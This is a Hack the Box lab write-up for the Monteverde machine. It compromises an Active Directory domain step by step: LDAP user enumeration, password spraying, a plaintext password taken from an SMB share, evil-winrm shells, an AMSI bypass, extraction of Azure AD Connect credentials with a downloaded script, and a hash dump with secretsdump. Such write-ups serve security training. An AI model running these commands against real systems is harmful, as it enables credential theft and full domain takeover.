---
title: "Hack the Box - Monteverde"
slug: "hack-the-box-monteverde"
date: "2024-03-14"
excerpt: "Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated and a user list is created. Through password spraying, the `SABatchJobs` service account is found to have the username as a password. Using this service account, it is possible to enumerate SMB Shares on the system, and the `$users` share is found to be world-readable. An XML file used for an Azure AD account is found within a user folder and contains a password. Due to password reuse, we can connect to the domain controller as `mhope` using WinRM. Enumeration shows that `Azure AD Connect` is installed. It is possible to extract the credentials for the account that replicates the directory changes to Azure (in this case the default domain administrator)."
cover: "cover.png"
tags:
  - Azure AD
  - MSOL
  - ADSync
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -Pn -oN scans/nmap.txt monteverde.htb
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-08 05:43:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### LDAP

We can see from the nmap scan that the domain is `megabank.local`. Add this to `/etc/hosts`. There doesn't seem to be any website either, nor are there any public SMB shares. Let's look into LDAP using `ldapsearch`.

We can make a userlist.

```bash
ldapsearch -x -H ldap://monteverde.htb -b "DC=megabank,DC=local" | grep -i userprincipalname | awk '{print $2}' | cut -d '@' -f 1 > userlist.txt
```

![](./20220808155512.png)  

### Password Spraying

We can use `crackmapexec` to password spray using the user's username as their password since we don't have any other information to go off.

```bash
crackmapexec smb megabank.local -u userlist.txt -p userlist.txt --shares
```

![](./20220808155758.png)  

```text
SABatchJobs:SABatchJobs
```

### SMB

There's a few non standard shares like `users$` and `azure_uploads`. The `azure_uploads` share is empty however the `user$` share has a few folders with user profiles.

```bash
smbclient -U 'megabank.local/SABatchJobs%SABatchJobs' //megabank.local/users\$
```

![](./20220808160022.png)  

In `mhope`'s folder there's an `azure.xml` file.

![](./20220808160143.png)  

If we look at the contents of the file we find a plaintext password.

![](./20220808160355.png)  

```text
mhope:4n0therD4y@n0th3r$
```

## Shell as mhope

We can password spray once more to check the credentials are valid.

```bash
crackmapexec winrm megabank.local -u userlist.txt -p '4n0therD4y@n0th3r$'
```

![](./20220808160438.png)  

```bash
evil-winrm -i megabank.local -u mhope -p '4n0therD4y@n0th3r$'
```

![](./20220808160517.png)  

### User.txt

```powershell
cat user.txt;ipconfig
```

![](./20220808160547.png)  

## Privilege Escalation

### Enumeration

There's a few things that tip us off that this is an Azure AD machine, one of those things being the `azure.xml` file. We can confirm this by checking groups.

```powershell
net groups /domain
```

![](./20220808161737.png)  

If we check the groups for `mhope` we can see we are actually part of the `Azure Admins` group.

```powershell
net users mhope
```

![](./20220808161815.png)  

### Bloodhound

We can also check this in bloodhound. First get an object dump and then upload it to bloodhound.

```bash
bloodhound-python -c All -u mhope -p '4n0therD4y@n0th3r$' -d megabank.local -dc megabank.local -ns 10.10.10.172
```

![](./20220808162043.png)  

We can check `mhope`'s group membership using bloodhound as well.

![](./20220808161856.png)  

### Azure AD

There is one thing that is a crucial part of Azure AD hybrid environment which is `Azure AD Sync`. This syncs information between the Azure AD cloud domain environment and the local one.

![](./20220808163259.png)  

There's also an `ADSync` table in the database.

```powershell
sqlcmd -S localhost -Q "select name from sys.databases"
```

![](./20220808170523.png)  

There's an awesome [article by Adam Chester](https://blog.xpnsec.com/azuread-connect-for-redteam/) that goes into depth on this attack and how it works. Within his post he does mention that the previous PoC doesn't work because of changes Microsoft have made to harden against this attack. He links another PoC that we can use which uses `xp_cmdshell`. Unfortunately we don't have `xp_cmdshell` enabled on the machine. We'll instead use the following PowerShell script.

```bash
wget https://raw.githubusercontent.com/glowbase/Get-MSOLCredentials.ps1/main/Get-MSOLCredentials.ps1
```

Upload the script.

```powershell
Bypass-4MSI
upload Get-MSOLCredentials.ps1
```

![](./20220808170916.png)  

Now we can invoke it.

```powershell
.\Get-MSOLCredentials.ps1
```

![](./20220808170959.png)  

```text
administrator:d0m@in4dminyeah!
```

## Shell as Administrator

```bash
evil-winrm -i megabank.local -u Administrator -p 'd0m@in4dminyeah!'
```

![](./20220808172015.png)  

### Root.txt

```powershell
cat root.txt;ipconfig
```

![](./20220808172057.png)  

## Post Exploitation

### Dumping Hashes

```bash
impacket-secretsdump 'monterverde/Administrator:d0m@in4dminyeah!@megabank.local' -outputfile hashes
```

![](./20220808172825.png)  